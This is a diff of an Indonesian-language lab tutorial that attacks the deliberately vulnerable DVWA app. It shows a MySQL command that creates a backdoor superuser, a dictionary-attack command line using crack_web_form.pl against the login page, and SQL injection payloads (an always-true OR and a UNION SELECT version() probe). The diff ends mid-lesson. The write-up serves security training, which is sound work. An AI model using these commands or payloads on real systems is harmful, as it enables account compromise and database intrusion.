@@ -70,4 +70,44 @@ pada gambar diatas terlihat bahwa user yang digunakan untuk mengakses dbms adala
 15. Selanjutnya kita coba menambahkan user baru. Query: **echo "use mysql; GRANT ALL PRIVILEGES ON *.* TO 'db_hacker'@'%' IDENTIFIED BY 'abc123' WITH GRANT OPTION;" | mysql -u root --password=""**
 ![](4/insertusersmysql.PNG)
 
-##Lesson 5(Using Tamper Data with crack_web_form.pl)
+##Lesson 5(Using Tamper Data with crack\_web_form.pl)
+Pada sesi kali ini kita akan mencoba mengeksploitasi celah pada login DVWA. Kita akan coba melakukan dictionary attack. Kita akan menggunakan tamper data untuk mengetahui request yang kita kirimkan dan cwf yang akan kita gunakan untuk melakukan dictionary attack berdasarkan detil yang telah kita peroleh dari tamper data.  
+1. Pertama-tama kita harus menampabahkan plugin tamper data pada browser kita
+![](5/installtamperdata.PNG)
+![](5/installtamperdata2.PNG)
+2. Lalu jalankan tamper data melalui menu tools pada sisi atas browser
+![](5/tamperdatatools.PNG)
+3. Selanjutnya kita buka halaman login DVWA. Dan masukkan username: **wew**, password: **wew**. Maka akan muncul tulisan **Login failed** yang berarti username dan password kita yang kita masukkan salah.
+![](5/loginfailed.PNG)
+4. Lalu kita buka tamper data yang telah kita jalankan. Terdapat beberapa request. Kita pilih yang merupakan login kita ke aplikasi dvwa.  
+![](5/tamperberhasil.PNG)
+5. Selanjutnya kita buat sebuah folder untuk menampung program yang akan kita gunakan untuk mengeksploit  
+![](5/buatfoldercwf.PNG)
+6. Selanjutnya kita download program yang akan gunakan untuk melakukan eksploit dan letakkan di dalam folder yang telah kita buat. Program dapat kita download di: **www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson5/cwf.tar.gz**  
+![](5/downloadcwf.PNG)
+7. Lalu ekstrak file yang telah kita download. Di dalamnya kita akan menemukan 2 buah file, satu file untuk melakukan eksploit dan satu file sebagai dictionary  
+![](5/hasilekstrakcwf.PNG)
+8. Kita dapat menggunakan program tersebut dengan perintah: **./crack\_web_form.pl -U admin -P password.txt -http "http://192.168.1.28/dvwa/login.php" -data "username=USERNAME&password="PASSWORD"&Login=Login" -M "Login failed** dimana:  
+	- -U digunakan untuk menentukan username. Kita tentukan usernamenya adalah **admin** dengan asumsi kita akan mencoba dengan username **admin**  
+	- -P untuk menentukan dictionary yang kita pakai  
+	- -http untuk menentukan url  
+	- -data untuk menentukan data yang kita dapat dari tamper data  
+	- -M untuk menentukan pesan error  
+![](5/cwfsyntax.PNG)
+9. Selanjutnya apabila kita jalankan perintah pada step 8, maka proses eksploit akan dimulai dan apabila berhasil program akan menampilkan pesan **success** dan menghentikan proses  
+![](5/cwfberhasil.PNG)  
+dapat kita lihat bahwa username yang benar adalah **admin** dan password yang benar adalah **password**
+
+##Lesson 6(SQL Injection)
+Sql injection adalah penyerangan dengan memanfaatkan celah pada mysql. Celah tersebut memungkinkan kita menjalankan perintah ke mysql hanya dengan memasukkannya pada form masukkan yang tersedia.  
+1. Pertama pada navigasi DVWA kita pilih sqlinjection  
+![](6/sqlinjectionberanda.PNG)
+2. Kita coba sembarang input  
+![](6/sqlinjectionbasic.PNG)
+pada bagian diatas memperlihatkan bahwa dvwa menampilkan id, firstname dan Surname. Namun php query yang akan kita eksploit adalah **$getid "SELECT first\_name, last\_name FROM users WHERE user\_id = '$id'";**. Id pada hasil query adalah id yang kita masukkan melalui input. Dvwa tidak benar benar melakukan query untuk menampilkan ID.  
+3. Selanjutnya kita coba sql injection basic menggunakan query **%' or '1'='1'** yang akan mereturn semua record karena pernyataan **'1'='1'** selalu benar. Query yang akan kita berikan ke database adalah **$getid = "SELECT first\_name, last\_name FROM users WHERE user\_id = '%' or '1'='1'";**  
+![](6/alwaystrue.PNG)
+4. Selanjutnya kita dapat menggunakan melihat versi dari daabase dengan syntax **%' or 0=0 union select null, version() #**  
+![](6/databaseversion.PNG)  
+dapat kita lihat bahwa record paling bawah pada bagian Surname menampilkan versi dari database.  
+5. 
